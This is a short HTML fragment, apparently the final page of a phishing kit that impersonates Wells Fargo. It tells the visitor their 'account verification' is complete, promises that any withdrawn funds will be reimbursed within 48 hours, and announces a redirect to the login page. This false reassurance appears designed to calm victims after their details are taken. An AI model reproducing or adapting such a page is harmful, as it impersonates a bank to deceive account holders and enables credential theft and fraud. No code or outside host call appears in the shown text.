...
<body>
	...
	<div class="container" style="height: 100%; padding-bottom: 1rem;">
		<div class="alert-form py-5 mx-auto">
			<h3 class="mb-3">Verification complete</h3>
			...
			<span style="font-size: 1.0rem; font-weight: 550;">Your Wells Fargo account verification is complete. If any funds were withdrawn from your account they will be automatically reimbursed within 48 hours. You will now be redirected to the login page in 10 seconds...</span>
